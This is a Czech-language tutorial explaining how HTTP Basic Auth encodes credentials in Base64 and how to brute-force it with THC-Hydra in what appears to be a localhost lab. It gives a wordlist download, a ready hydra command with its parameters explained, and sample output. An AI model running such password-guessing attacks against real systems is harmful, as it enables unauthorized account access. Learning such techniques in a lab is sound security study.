## 🔑 Základní HTTP Autentizace (Basic Auth)

> **Co to je:** Jednoduchá, ale stále používaná metoda pro omezení přístupu k webovým zdrojům. Z hlediska bezpečnosti je zranitelná, protože heslo není šifrováno – pouze zakódováno.

### ⚙️ Jak Basic Auth funguje

1. **Výzva serveru:** Při pokusu o přístup k chráněnému zdroji server odpoví stavovým kódem `401 Unauthorized` a hlavičkou `WWW-Authenticate`.
    
2. **Formátování údajů:** Prohlížeč spojí uživatelské jméno a heslo pomocí dvojtečky (`jméno:heslo`).
    
3. **Kódování:** Výsledný řetězec se zakóduje do formátu **Base64** (např. `alice:secret123` $\rightarrow$ `YWxpY2U6c2VjcmV0MTIz`).
    
4. **Odeslání:** Kódovaný řetězec je odeslán v HTTP hlavičce `Authorization`:
    
    HTTP
    
    ```
    GET /protected_resource HTTP/1.1
    Host: www.example.com
    Authorization: Basic YWxpY2U6c2VjcmV0MTIz
    ```
    

> ⚠️ **Bezpečnostní riziko:** Base64 **není šifrování**. Kdokoliv, kdo odchytí síťový provoz (pokud se nepoužívá HTTPS), může řetězec okamžitě dekódovat zpět na plaintext.

## 🐉 Prolomení Basic Auth pomocí THC-Hydra

Protože Basic Auth nepoužívá komplexní CSRF tokeny ani složité přihlašovací formuláře, je brute-force útok pomocí modulu `http-get` v Hydře velmi rychlý a spolehlivý.

### 🛠️ Postup útoku

#### 1. Stáhnutí vhodného wordlistu

Bash

```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

#### 2. Spuštění nástroje Hydra

Známe-li uživatelské jméno (v tomto případě `basic-auth-user`), cílíme pouze na prolomení hesla:

Bash

```
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

#### 🔍 Rozbor použitého příkazu:

|**Parametr**|**Význam**|
|---|---|
|**`-l basic-auth-user`**|Určuje jedno známé uživatelské jméno.|
|**`-P 2023-200_most_used_passwords.txt`**|Cesta ke slovníku s hesly.|
|**`127.0.0.1`**|Cílová IP adresa (localhost / IP instance).|
|**`http-get /`**|Útok na modul HTTP Basic Auth odesíláním GET požadavků na kořenovou cestu `/`.|
|**`-s 81`**|Specifikuje cílový port (zde nestandardní port 81).|

### 🏆 Výsledek útoku

Po dokončení útok vrátí platnou kombinaci údajů přímo v terminálu:

Plaintext

```
[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: <NALEZENÉ_HESLO>
1 of 1 target successfully completed, 1 valid password found
```